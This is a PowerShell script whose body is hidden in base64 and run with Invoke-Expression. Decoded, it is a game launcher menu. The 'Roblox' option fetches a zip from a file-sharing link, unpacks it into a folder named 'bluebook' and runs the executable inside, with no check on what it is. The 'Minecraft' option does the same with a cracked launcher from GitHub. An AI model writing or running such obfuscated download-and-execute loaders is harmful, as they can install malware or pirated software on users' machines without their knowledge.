$b64 = "Q2xlYXItSG9zdA0KJEhvc3QuVUkuUmF3VUkuV2luZG93VGl0bGUgPSAiT3BpdW0gTGF1bmNoZXIgLSBAcmVwb25pZyINCg0KJEJsdWVib29rUGF0aCA9ICIkZW52OkxPQ0FMQVBQREFUQVxQcm9ncmFtc1xibHVlYm9vayINCmlmICghKFRlc3QtUGF0aCAkQmx1ZWJvb2tQYXRoKSkgew0KICAgIE5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLVBhdGggJEJsdWVib29rUGF0aCB8IE91dC1OdWxsDQp9DQoNCmZ1bmN0aW9uIFdyaXRlLUNvbG9yIHsNCiAgICBwYXJhbSAoJFRleHQsICRDb2xvcikNCiAgICBXcml0ZS1Ib3N0ICRUZXh0IC1Gb3JlZ3JvdW5kQ29sb3IgJENvbG9yDQp9DQoNCmZ1bmN0aW9uIEV4dHJhY3QtWmlwRmxhdCB7DQogICAgcGFyYW0gKCRaaXBQYXRoLCAkRGVzdGluYXRpb24pDQoNCiAgICBBZGQtVHlwZSAtQXNzZW1ibHlOYW1lIFN5c3RlbS5JTy5Db21wcmVzc2lvbi5GaWxlU3lzdGVtDQogICAgJHppcCA9IFtTeXN0ZW0uSU8uQ29tcHJlc3Npb24uWmlwRmlsZV06Ok9wZW5SZWFkKCRaaXBQYXRoKQ0KDQogICAgZm9yZWFjaCAoJGVudHJ5IGluICR6aXAuRW50cmllcykgew0KICAgICAgICBpZiAoW3N0cmluZ106OklzTnVsbE9yV2hpdGVTcGFjZSgkZW50cnkuTmFtZSkpIHsgY29udGludWUgfQ0KDQogICAgICAgICRkZXN0RmlsZSA9IEpvaW4tUGF0aCAkRGVzdGluYXRpb24gJGVudHJ5Lk5hbWUNCiAgICAgICAgaWYgKFRlc3QtUGF0aCAkZGVzdEZpbGUpIHsgY29udGludWUgfQ0KDQogICAgICAgICRlbnRyeS5FeHRyYWN0VG9GaWxlKCRkZXN0RmlsZSkNCiAgICB9DQoNCiAgICAkemlwLkRpc3Bvc2UoKQ0KfQ0KDQpmdW5jdGlvbiBEb3dubG9hZC1Sb2Jsb3ggew0KICAgICRleGVQYXRoID0gSm9pbi1QYXRoICRCbHVlYm9va1BhdGggIlJvYmxveFBsYXllckJldGEuZXhlIg0KICAgIGlmIChUZXN0LVBhdGggJGV4ZVBhdGgpIHsNCiAgICAgICAgU3RhcnQtUHJvY2VzcyAkZXhlUGF0aA0KICAgICAgICByZXR1cm4NCiAgICB9DQoNCiAgICAkemlwUGF0aCA9ICIkZW52OlRFTVBccm9ibG94LnppcCINCiAgICAkdXJsID0gImh0dHBzOi8vd3d3LmRpcmVjdGZpbGVzLmxpbmsvQ1FPN1c3VDNMIg0KDQogICAgV3JpdGUtQ29sb3IgIkRvd25sb2FkaW5nIFJvYmxveC4uLiIgWWVsbG93DQogICAgSW52b2tlLVdlYlJlcXVlc3QgJHVybCAtT3V0RmlsZSAkemlwUGF0aA0KDQogICAgV3JpdGUtQ29sb3IgIkV4dHJhY3RpbmcgUm9ibG94Li4uIiBZZWxsb3cNCiAgICBFeHRyYWN0LVppcEZsYXQgJHppcFBhdGggJEJsdWVib29rUGF0aA0KICAgIFJlbW92ZS1JdGVtICR6aXBQYXRoIC1Gb3JjZQ0KDQogICAgU3RhcnQtUHJvY2VzcyAkZXhlUGF0aA0KfQ0KDQpmdW5jdGlvbiBEb3dubG9hZC1NaW5lY3JhZnQgew0KICAgICRleGVQYXRoID0gSm9pbi1QYXRoICRCbHVlYm9va1BhdGggInByaXNtbGF1bmNoZXIuZXhlIg0KICAgIGlmIChUZXN0LVBhdGggJGV4ZVBhdGgpIHsNCiAgICAgICAgU3RhcnQtUHJvY2VzcyAkZXhlUGF0aA0KICAgICAgICByZXR1cm4NCiAgICB9DQoNCiAgICAkemlwUGF0aCA9ICIkZW52OlRFTVBccHJpc20uemlwIg0KICAgICR1cmwgPSAiaHR0cHM6Ly9naXRodWIuY29tL0RpZWdpd2cvUHJpc21MYXVuY2hlci1DcmFja2VkL3JlbGVhc2VzL2Rvd25sb2FkLzEwLjAuMi9QcmlzbUxhdW5jaGVyLVdpbmRvd3MtTVNWQy1Qb3J0YWJsZS0xMC4wLjIuemlwIg0KDQogICAgV3JpdGUtQ29sb3IgIkRvd25sb2FkaW5nIE1pbmVjcmFmdC4uLiIgWWVsbG93DQogICAgSW52b2tlLVdlYlJlcXVlc3QgJHVybCAtT3V0RmlsZSAkemlwUGF0aA0KDQogICAgV3JpdGUtQ29sb3IgIkV4dHJhY3RpbmcgTWluZWNyYWZ0Li4uIiBZZWxsb3cNCiAgICBFeHRyYWN0LVppcEZsYXQgJHppcFBhdGggJEJsdWVib29rUGF0aA0KICAgIFJlbW92ZS1JdGVtICR6aXBQYXRoIC1Gb3JjZQ0KDQogICAgU3RhcnQtUHJvY2VzcyAkZXhlUGF0aA0KfQ0KDQpXcml0ZS1Db2xvciAiT3BpdW0gTGF1bmNoZXIgLSBAcmVwb25pZyIgTWFnZW50YQ0KV3JpdGUtSG9zdCAiIg0KV3JpdGUtQ29sb3IgIlsxXSBMYXVuY2ggUm9ibG94IiBSZWQNCldyaXRlLUNvbG9yICJbMl0gTGF1bmNoIE1pbmVjcmFmdCIgR3JlZW4NCldyaXRlLUhvc3QgIiINCldyaXRlLUNvbG9yICJJZiB5b3Ugd2FudCBtZSB0byBhZGQgbW9yZSwgam9pbiB0aGUgZGlzY29yZCBzZXJ2ZXIgYW5kIGxldCBtZSBrbm93OiBkaXNjb3JkLmdnL0p6eEVHQThaNHEiIEJsdWUNCg0KJGtleSA9ICRIb3N0LlVJLlJhd1VJLlJlYWRLZXkoIk5vRWNobyxJbmNsdWRlS2V5RG93biIpLkNoYXJhY3Rlcg0Kc3dpdGNoICgka2V5KSB7DQogICAgIjEiIHsgRG93bmxvYWQtUm9ibG94IH0NCiAgICAiMiIgeyBEb3dubG9hZC1NaW5lY3JhZnQgfQ0KfQ0K"
$code = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b64))
Invoke-Expression $code
